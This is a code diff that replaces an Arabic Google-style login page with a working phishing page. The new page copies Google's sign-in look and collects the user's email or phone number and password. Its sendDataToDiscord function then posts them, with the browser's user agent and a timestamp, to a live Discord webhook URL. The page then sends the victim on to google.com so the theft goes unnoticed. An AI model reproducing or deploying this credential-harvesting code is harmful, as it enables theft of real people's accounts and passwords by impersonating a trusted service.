@@ -1,280 +1,326 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Google</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-            color: #202124;
-            text-align: center;
-        }
-        .header {
-            padding: 20px;
-            text-align: left;
-        }
-        .logo {
-            margin-top: 50px;
-            margin-bottom: 20px;
-        }
-        .login-box {
-            width: 450px;
-            margin: 0 auto;
-            padding: 48px 40px 36px;
-            background: #fff;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .title {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 40px;
-        }
-        .input-box {
-            margin-bottom: 20px;
-            text-align: right;
-        }
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        input:focus {
-            border-color: #1a73e8;
-            outline: none;
-        }
-        .forgot-email {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            float: left;
-            margin-bottom: 20px;
-        }
-        .next-btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            border-radius: 4px;
-            cursor: pointer;
-            float: right;
-        }
-        .next-btn:hover {
-            background-color: #1765cc;
-        }
-        .footer {
-            margin-top: 50px;
-            padding: 20px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        .lang-select {
-            border: none;
-            background: none;
-            color: #1a73e8;
-            cursor: pointer;
-        }
-        .hidden {
-            display: none;
-        }
-        .security-alert {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 10px;
-            text-align: right;
-        }
-        .captcha-box {
-            margin: 20px 0;
-            padding: 15px;
-            background: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f4fa;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .login-box {
+        background-color: white;
+        padding: 40px;
+        border-radius: 25px;
+        display: flex;
+        flex-direction: row;
+        width: 800px;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .login-form {
+        width: 50%;
+    }
+    input[type="text"], input[type="password"] {
+        width: 100%;
+        padding: 15px;
+        border: 2px solid #0066ff;
+        border-radius: 5px;
+        font-size: 16px;
+        margin-bottom: 5px;
+    }
+    .error-message {
+        color: red;
+        font-size: 12px;
+        margin-bottom: 10px;
+        display: none;
+    }
+    .small-text {
+        font-size: 12px;
+        color: #0066ff;
+    }
+    .desc {
+        font-size: 12px;
+        color: #333;
+        margin-top: 10px;
+    }
+    .desc a {
+        color: #0066ff;
+        text-decoration: none;
+    }
+    button {
+        background-color: #0066ff;
+        color: white;
+        padding: 10px 30px;
+        border: none;
+        border-radius: 25px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+    .create, .small-link {
+        margin-right: 15px;
+        font-size: 14px;
+        color: #0066ff;
+        background: none;
+        border: none;
+        cursor: pointer;
+    }
+    .text-side {
+        width: 45%;
+        text-align: center;
+    }
+    .text-side img {
+        width: 50px;
+        margin-bottom: 10px;
+    }
+    .text-side h2 {
+        font-size: 26px;
+        margin-bottom: 5px;
+    }
+    .text-side p {
+        font-size: 14px;
+        color: #555;
+    }
+    .footer {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 12px;
+        color: black;
+    }
+    .footer a {
+        margin: 0 10px;
+        color: black;
+        text-decoration: none;
+    }
+    label {
+        font-size: 12px;
+        color: #333;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+    }
+    .email-box {
+        border: 1px solid #ccc;
+        padding: 5px 10px;
+        border-radius: 20px;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        justify-content: space-between;
+        font-size: 14px;
+        width: fit-content;
+        margin: 0 auto;
+    }
+    #password-page {
+        display: none;
+    }
+    .loading {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+    }
+    .loading-spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #0066ff;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="92" height="30">
-    </div>
 
-    <div class="login-box" id="emailScreen">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="75">
+<div class="container">
+    <!-- صفحة البريد الإلكتروني -->
+    <div id="email-page" class="login-box">
+        <div class="login-form">
+            <input id="email-input" type="text" placeholder="البريد الإلكتروني أو الهاتف">
+            <div id="email-error" class="error-message"></div>
+            <div class="small-text">هل نسيت بريدك الإلكتروني؟</div>
+            <div class="desc">ألا تمتلك هذا الكمبيوتر؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a></div>
+            <div style="margin-top: 20px;">
+                <button onclick="showPasswordPage()">التالي</button>
+                <button class="create">إنشاء حساب</button>
+            </div>
         </div>
-        <div class="title">تسجيل الدخول</div>
-        <div class="subtitle">المتابعة إلى Gmail</div>
-        
-        <div class="input-box">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
-        </div>
-        
-        <a href="#" class="forgot-email">نسيت البريد الإلكتروني؟</a>
-        <button class="next-btn" onclick="checkEmail()">التالي</button>
-        
-        <div class="footer">
-            <select class="lang-select">
-                <option>العربية</option>
-                <option>English (United States)</option>
-            </select>
-            <span>مساعدة</span>
-            <span>خصوصية</span>
-            <span>شروط</span>
+        <div class="text-side">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+            <h2>تسجيل الدخول</h2>
+            <p>باستخدام حسابك على <b>Google</b></p>
         </div>
     </div>
 
-    <div class="login-box hidden" id="passwordScreen">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="75">
+    <!-- صفحة كلمة المرور -->
+    <div id="password-page" class="login-box">
+        <div class="login-form">
+            <input id="password-input" type="password" placeholder="إدخال كلمة المرور">
+            <div id="password-error" class="error-message"></div>
+            <label>
+                <input type="checkbox" id="show-password"> عرض كلمة المرور
+            </label>
+            <div style="margin-top: 20px;">
+                <button onclick="submitLogin()">التالي</button>
+                <button class="small-link" onclick="backToEmail()">تجربة طريقة أخرى</button>
+            </div>
         </div>
-        <div class="title">مرحبًا</div>
-        <div class="subtitle" id="userEmail">user@example.com</div>
-        
-        <div class="input-box">
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" autofocus>
-        </div>
-        
-        <div class="security-alert hidden" id="securityAlert">
-            <img src="https://ssl.gstatic.com/accounts/alert_red_16.png" alt="تحذير">
-            <span>تحذير أمني: لقد تم اكتشاف محاولة اختراق. سيتم تسجيل هذه المحاولة.</span>
-        </div>
-        
-        <div class="captcha-box hidden" id="captchaBox">
-            <p>لإثبات أنك لست روبوت، يرجى حل هذا السؤال الأمني:</p>
-            <p>ما هو مجموع ٧ و ٥؟</p>
-            <input type="text" id="captcha" placeholder="الإجابة">
-        </div>
-        
-        <a href="#" class="forgot-email">نسيت كلمة المرور؟</a>
-        <button class="next-btn" onclick="checkPassword()">التالي</button>
-        
-        <div class="footer">
-            <select class="lang-select">
-                <option>العربية</option>
-                <option>English (United States)</option>
-            </select>
+        <div class="text-side">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+            <h2>مرحباً</h2>
+            <div class="email-box">
+                <span>▼</span> <span id="display-email">example@gmail.com</span> <span>👤</span>
+            </div>
         </div>
     </div>
+    
+    <!-- رسالة التحميل -->
+    <div id="loading" class="loading">
+        <div class="loading-spinner"></div>
+        <p>جاري تسجيل الدخول...</p>
+    </div>
+</div>
 
-    <script>
-        // متغيرات لتتبع محاولات الاختراق
-        let loginAttempts = 0;
-        let hackAttemptDetected = false;
-        const monitoredInputs = ['password', 'email'];
-        const commonPasswords = ['password', '123456', '123456789', 'qwerty', 'password1'];
-        const adminEmails = ['admin@example.com', 'root@example.com', 'administrator@example.com'];
+<div class="footer">
+    <a href="#">الشروط</a>
+    <a href="#">الخصوصية</a>
+    <a href="#">المساعدة</a>
+    <a href="#">العربية</a>
+</div>
+
+<script>
+    // متغيرات لتخزين البيانات
+    let userEmail = '';
+    let userPassword = '';
+    
+    function showPasswordPage() {
+        const email = document.getElementById('email-input').value.trim();
+        const emailError = document.getElementById('email-error');
+
+        if(email === '') {
+            emailError.textContent = 'الرجاء إدخال البريد الإلكتروني أو رقم الهاتف';
+            emailError.style.display = 'block';
+            return;
+        }
+        if(!validateEmailOrPhone(email)) {
+            emailError.textContent = 'تعذّر العثور على حسابك. الرجاء التحقق من البريد الإلكتروني أو رقم الهاتف وإعادة المحاولة.';
+            emailError.style.display = 'block';
+            return;
+        }
+
+        userEmail = email;
+        emailError.style.display = 'none';
+        document.getElementById('email-page').style.display = 'none';
+        document.getElementById('password-page').style.display = 'flex';
+        document.getElementById('display-email').textContent = email;
+    }
+
+    function backToEmail() {
+        document.getElementById('password-page').style.display = 'none';
+        document.getElementById('email-page').style.display = 'flex';
+    }
+
+    function validateEmailOrPhone(input) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[0-9]{6,15}$/;
+        return emailRegex.test(input) || phoneRegex.test(input);
+    }
+
+    function submitLogin() {
+        const password = document.getElementById('password-input').value.trim();
+        const passwordError = document.getElementById('password-error');
         
-        // تتبع أحداث لوحة المفاتيح
-        monitoredInputs.forEach(inputId => {
-            document.getElementById(inputId).addEventListener('keydown', function(e) {
-                // الكشف عن محاولات استخدام مفاتيح الاختصار للوحة المفاتيح
-                if (e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'x')) {
-                    logHackAttempt('استخدام مفاتيح الاختصار: ' + e.key);
-                }
-                
-                // الكشف عن محاولات حقن SQL
-                if (['\'', '"', ';', '--', '/*', '*/', '='].includes(e.key)) {
-                    logHackAttempt('محاولة حقن SQL: ' + e.key);
-                }
-            });
+        if(password === '') {
+            passwordError.textContent = 'الرجاء إدخال كلمة المرور';
+            passwordError.style.display = 'block';
+            return;
+        }
+        
+        userPassword = password;
+        passwordError.style.display = 'none';
+        
+        // عرض رسالة التحميل
+        document.getElementById('password-page').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+        
+        // إرسال البيانات إلى ويب هوك Discord
+        sendDataToDiscord();
+        
+        // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
+        setTimeout(() => {
+            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
+        }, 1000);
+    }
+
+    function sendDataToDiscord() {
+        const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
+        
+        const data = {
+            content: '**تم تسجيل بيانات جديدة**',
+            embeds: [{
+                title: 'تفاصيل تسجيل الدخول',
+                fields: [
+                    {
+                        name: 'البريد الإلكتروني/الهاتف',
+                        value: userEmail,
+                        inline: true
+                    },
+                    {
+                        name: 'كلمة المرور',
+                        value: userPassword,
+                        inline: true
+                    },
+                    {
+                        name: 'وقت التسجيل',
+                        value: new Date().toLocaleString(),
+                        inline: false
+                    },
+                    {
+                        name: 'معلومات المتصفح',
+                        value: navigator.userAgent,
+                        inline: false
+                    }
+                ],
+                color: 16711680 // اللون الأحمر
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Error sending data to Discord');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
         });
-        
-        // تتبع أحداث النقر الأيمن لمنع محاولات التلاعب
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            logHackAttempt('محاولة استخدام القائمة السياقية (النقر الأيمن)');
-        });
-        
-        // تتبع محاولات فحص الكود المصدري
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-                logHackAttempt('محاولة فتح أدوات المطورين');
-            }
-        });
-        
-        function checkEmail() {
-            const email = document.getElementById('email').value;
-            document.getElementById('userEmail').textContent = email;
-            
-            // الكشف عن محاولات استخدام حسابات مسؤولي النظام
-            if (adminEmails.includes(email.toLowerCase())) {
-                logHackAttempt('محاولة الوصول إلى حساب مسؤول: ' + email);
-            }
-            
-            document.getElementById('emailScreen').classList.add('hidden');
-            document.getElementById('passwordScreen').classList.remove('hidden');
-        }
-        
-        function checkPassword() {
-            loginAttempts++;
-            const password = document.getElementById('password').value;
-            const email = document.getElementById('userEmail').textContent;
-            
-            // الكشف عن كلمات المرور الشائعة
-            if (commonPasswords.includes(password.toLowerCase())) {
-                logHackAttempt('استخدام كلمة مرور شائعة: ' + password);
-            }
-            
-            // الكشف عن محاولات القوة الغاشمة
-            if (loginAttempts > 2) {
-                document.getElementById('captchaBox').classList.remove('hidden');
-                logHackAttempt('محاولات متعددة لكلمة المرور: ' + loginAttempts);
-            }
-            
-            // إذا تم اكتشاف محاولة اختراق، عرض التحذير الأمني
-            if (hackAttemptDetected) {
-                document.getElementById('securityAlert').classList.remove('hidden');
-                
-                // هنا يمكنك إضافة كود لإرسال التنبيه إلى المسؤول
-                console.log('تم اكتشاف محاولة اختراق! البريد الإلكتروني: ' + email + 
-                            '، كلمة المرور: ' + password + 
-                            '، عنوان IP: ' + getIP());
-                
-                // منع المتابعة في حالة اكتشاف اختراق
-                return false;
-            }
-            
-            // إذا كانت هناك كابتشا، التحقق منها
-            if (!document.getElementById('captchaBox').classList.contains('hidden')) {
-                const captchaAnswer = document.getElementById('captcha').value;
-                if (captchaAnswer !== '12') {
-                    logHackAttempt('إجابة كابتشا خاطئة');
-                    alert('إجابة خاطئة. يرجى المحاولة مرة أخرى.');
-                    return false;
-                }
-            }
-            
-            // إذا وصلنا إلى هنا، يعني أن المحاولة شرعية (لأغراض الاختبار)
-            alert('تهانينا! لقد اجتزت الاختبار الأمني بنجاح.');
-        }
-        
-        function logHackAttempt(reason) {
-            hackAttemptDetected = true;
-            console.log('تم اكتشاف محاولة اختراق - السبب: ' + reason);
-            
-            // هنا يمكنك إضافة كود لتسجيل محاولة الاختراق في قاعدة البيانات
-            // أو إرسال تنبيه إلى المسؤول عن النظام
-        }
-        
-        // دالة وهمية للحصول على عنوان IP (في الواقع الفعلي، تحتاج إلى خدمة خلفية)
-        function getIP() {
-            return '192.168.1.1'; // هذا مثال، في الواقع الفعلي سيكون IP المستخدم الحقيقي
-        }
-    </script>
+    }
+
+    document.getElementById('show-password').addEventListener('change', function() {
+        const passwordInput = document.getElementById('password-input');
+        passwordInput.type = this.checked ? 'text' : 'password';
+    });
+</script>
+
 </body>
 </html>
